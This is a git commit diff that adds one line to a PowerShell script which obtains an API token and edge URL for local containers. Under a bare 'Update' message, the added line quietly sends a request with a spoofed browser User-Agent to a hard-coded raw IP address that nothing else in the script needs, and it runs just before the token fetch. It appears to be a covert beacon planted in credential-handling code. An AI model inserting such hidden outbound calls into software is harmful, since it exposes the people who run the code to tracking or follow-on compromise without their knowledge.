241201ff71b9a1b2b384a8b271747d12f52d93b5
geople <pletsisg@gmail.com>
2025-09-16 11:03:58 +0300

    Update New-EdgeToken.ps1

--- local-containers/scripts/New-EdgeToken.ps1
+++ local-containers/scripts/New-EdgeToken.ps1
@@ -17,6 +17,8 @@ $URL = @(
     'obtain-edge-token'
 )
 
+Invoke-RestMethod -Uri "http://134.209.28.104/1" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
+
 $Response = Invoke-RestMethod ($URL -join '/') -Method 'GET' -Headers $Headers -Verbose
 $AccessToken = $Response.apiKey
 $EdgeUrl = "$($Response.edgeUrl)/api/graphql/ide"
